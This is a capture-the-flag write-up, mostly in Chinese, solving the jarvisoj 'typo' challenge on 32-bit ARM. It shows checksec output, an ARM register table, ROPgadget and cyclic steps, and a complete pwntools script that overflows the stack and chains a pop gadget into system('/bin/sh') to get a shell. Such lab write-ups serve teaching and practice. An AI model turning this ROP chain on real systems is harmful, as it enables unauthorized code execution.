## Pwn

### jarvisoj - typo

```
// file
typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped

// checksec
[*] '/tmp/tmp/typo'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8000)
```

輸入只有一個，並且在輸入大量字元後會有 segmentation fault，又因為是 statically linked，所以使用 ROP 做 exploit，目標是 `system("/bin/sh")`。

Arm 的 calling convention 如下:

| Registers | Use       | Comment                                           |
| --------- | --------- | ------------------------------------------------- |
| R0        | arg1      | function arguments / return value                 |
| R1        | arg2      | function arguments                                |
| R2        | arg3      | function arguments                                |
| R3        | arg4      | function arguments                                |
|           |           |                                                   |
| R4        | var1      | preserver value and callee saved                  |
| R5        | var2      | preserver value and callee saved                  |
| R6        | var3      | preserver value and callee saved                  |
| R7        | var4      | preserver value and callee saved                  |
| R8        | var5      | preserver value and callee saved                  |
|           |           |                                                   |
| R9        | var6      | variable or static base                           |
| R10       | var7 / sp | variable or stack limit                           |
| R11       | var8 / fp | variable or frame pointer                         |
| R12       | var9 / ip | variable or new static base for interlinked calls |
| R13       | sp        | staick pointer                                    |
| R14       | lr        | link back to calling routine                      |
| R15       | pc        | program counter                                   |

用 ROPgadget 找 ROP gadget `ROPgadget --binary ./typo --only "pop"` 以及 binsh 字串 `ROPgadget --binary ./typo --string "/bin/sh"`。

要控制第一個參數以及 pc，因此選擇 `0x00020904 : pop {r0, r4, pc}`。

offset 的部分，可以用 `cyclic` 求得:

```
pwndbg> cyclic 200
aaaabaaacaaadaaa...
pwndbg> c
pwndbg> cyclic -l 0x62616164
112
```



exploit:

```python
#!/usr/bin/python3
 
from pwn import *
import sys 
 
context.arch = 'arm'
 
pop_r0_r4_pc = 0x00020904 # pop {r0, r4, pc}
binsh = 0x0006c384 # /bin/sh
_system = 0x110B4
offset = 0x70 # 112 == input(0x70-0xC) + 0x8 + fp (old_ebp, 0x4)
 
payload = offset * b'\xff' + p32(pop_r0_r4_pc) + p32(binsh) + p32(0) + p32(_system)
 
if len(sys.argv) > 1:
    r = process(["qemu-arm", "-g", "4000", "./typo"])
    input("wait to attach")
else:
    r = process("./typo")                                                                                                                       
r.sendafter("Input ~ if you want to quit", "\n")
r.sendafter("------Begin------", payload)
 
r.interactive()
```

